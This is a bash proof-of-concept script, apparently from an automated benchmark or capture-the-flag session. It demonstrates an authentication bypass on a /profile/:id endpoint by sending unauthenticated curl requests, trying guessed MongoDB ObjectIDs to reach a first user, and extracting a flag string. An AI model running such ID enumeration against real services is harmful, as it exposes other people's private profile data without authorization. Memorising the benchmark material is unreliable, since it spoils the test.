#!/bin/bash
# POC: POC to demonstrate that the /profile/:id endpoint is accessible without any authentication, allowing unauthenticated users to view any user's profile including sensitive data like flags
# Target: ./repo
# Created: 2025-12-01T16:12:50.173Z
# Session: benchmark-XBEN-099-24-minc74t1

# Authentication Bypass POC - Profile Endpoint
# This POC demonstrates that the /profile/:id endpoint is accessible without authentication

TARGET_URL="${1:-http://localhost:3000}"

echo "[*] Authentication Bypass POC - Profile Endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Access arbitrary user profile without authentication
echo "[TEST 1] Attempting to access arbitrary user profile without authentication"
echo "[*] Sending: curl -s '$TARGET_URL/profile/692dbe5d1cc493c06cd752af'"
echo ""

RESPONSE=$(curl -s "$TARGET_URL/profile/692dbe5d1cc493c06cd752af")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/profile/692dbe5d1cc493c06cd752af")

echo "[RESPONSE] HTTP Status: $HTTP_CODE"
echo "[RESPONSE] Body:"
echo "$RESPONSE"
echo ""

# Check if we got a successful response with user content
if echo "$RESPONSE" | grep -q "Welcome"; then
    echo "[!] SUCCESS: Got user profile without authentication!"
    echo "[!] The endpoint returned HTTP $HTTP_CODE with user content"
    echo ""
else
    echo "[-] FAILED: Could not access profile"
    exit 1
fi

# Test 2: Try to find and access the first user (user0) which should have the flag
echo "[TEST 2] Attempting to enumerate and access first user profile (user0)"
echo ""

# First, let's try a common ObjectID pattern for the first user
FIRST_USER_IDS=(
    "692dbe531cc493c06cd752a1"
    "000000000000000000000001"
    "507f1f77bcf86cd799439011"
)

for USER_ID in "${FIRST_USER_IDS[@]}"; do
    echo "[*] Trying user ID: $USER_ID"
    RESPONSE=$(curl -s "$TARGET_URL/profile/$USER_ID")
    
    if echo "$RESPONSE" | grep -q "user0\|flag"; then
        echo "[!] Found user0 profile at ID: $USER_ID"
        echo "[!] Response contains:"
        echo "$RESPONSE" | head -20
        echo ""
        
        # Extract flag if present
        if echo "$RESPONSE" | grep -q "flag{"; then
            FLAG=$(echo "$RESPONSE" | grep -oP 'flag\{[^}]*\}')
            echo "[!] CRITICAL: Flag exposed without authentication: $FLAG"
        fi
        break
    fi
done

# Test 3: Verify no authentication mechanism is enforced
echo "[TEST 3] Verify no authentication headers are required"
echo "[*] Sending request with no cookies or Authorization headers"
echo ""

RESPONSE=$(curl -s -i "$TARGET_URL/profile/692dbe5d1cc493c06cd752af" 2>&1 | head -20)
echo "$RESPONSE"
echo ""

if echo "$RESPONSE" | grep -q "401\|403\|Unauthorized\|Forbidden"; then
    echo "[-] Found authentication check (401/403)"
    exit 1
else
    echo "[!] SUCCESS: No authentication mechanism enforced"
    echo "[!] The endpoint accepts unauthenticated requests"
fi

echo ""
echo "[*] POC COMPLETE: Authentication bypass confirmed on /profile/:id endpoint"
echo "[*] Impact: Any unauthenticated user can access any user's profile"